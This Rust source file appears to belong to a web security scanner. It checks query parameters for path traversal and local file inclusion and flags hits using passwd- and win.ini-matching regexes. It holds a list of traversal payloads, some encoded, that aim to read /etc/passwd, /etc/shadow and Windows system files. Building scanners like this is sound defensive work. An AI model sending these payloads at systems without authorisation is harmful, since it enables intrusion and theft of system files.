//! Path Traversal detection.

use regex::Regex;
use url::Url;
use grym_core::{Confidence, Finding, AssetRef, Severity, Evidence,
                ScopedClient, ScopedClientError, TechniqueTier};

const PATH_TRAVERSAL_PAYLOADS: &[&str] = &[
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..;/etc/passwd",
    "/etc/passwd",
    "file:///etc/passwd",
    "....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    "../etc/shadow",
    "../../../windows/win.ini",
];

const LFI_INDICATORS: &[&str] = &[
    r"root:.*:0:0:",
    r"daemon:.*:1:1:",
    r"bin:.*:2:2:",
    r"\[fonts\]",
    r"\[extensions\]",
    r"\[mail\]",
    r"\[compatibility\]",
    r"for 16-bit app support",
];

pub async fn check_path_traversal(
    client: &ScopedClient,
    url: &Url,
) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();

    let file_params = ["file", "path", "doc", "document", "page", "root",
                        "load", "read", "dir", "show", "include", "require",
                        "template", "view", "folder", "location", "f"];

    let base_query: Vec<(String, String)> = url.query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect();

    if base_query.is_empty() {
        return Ok(findings);
    }

    for (param_name, _value) in &base_query {
        if !file_params.contains(&param_name.as_str()) {
            continue;
        }

        for payload in PATH_TRAVERSAL_PAYLOADS {
            let mut test_url = url.clone();
            {
                let mut pairs = test_url.query_pairs_mut();
                pairs.clear();
                for (k, v) in &base_query {
                    let val = if k == param_name { payload.to_string() } else { v.clone() };
                    pairs.append_pair(k, &val);
                }
            }

            if let Ok(response) = client
                .get("grym-web-scanner", test_url, TechniqueTier::StandardDetection)
                .await
            {
                for indicator in LFI_INDICATORS {
                    if let Ok(re) = Regex::new(indicator)
                        && re.is_match(&response.body) {
                            let mut finding = Finding::new(
                                format!("Path Traversal / LFI detected in parameter '{}'", param_name),
                                AssetRef {
                                    identifier: url.to_string(),
                                    kind: "web".into(),
                                },
                                Severity::Critical,
                                Confidence::Confirmed,
                                "grym-web-scanner",
                            );
                            finding.categories.push("A05:2025-Injection".into());
                            finding.cwe_ids.push(22);
                            finding.evidence.push(Evidence::redacted(
                                "path-traversal",
                                format!("Payload: {}, Indicator: {}", payload, indicator),
                                response.body.chars().take(200).collect::<String>(),
                            ));
                            finding.remediation = "Validate file paths against an allowlist. Use a chroot jail or sandbox for file operations.".into();
                            finding.references.push("https://owasp.org/www-community/attacks/Path_Traversal".into());
                            findings.push(finding);
                            break;
                        }
                }
            }
        }
    }

    Ok(findings)
}
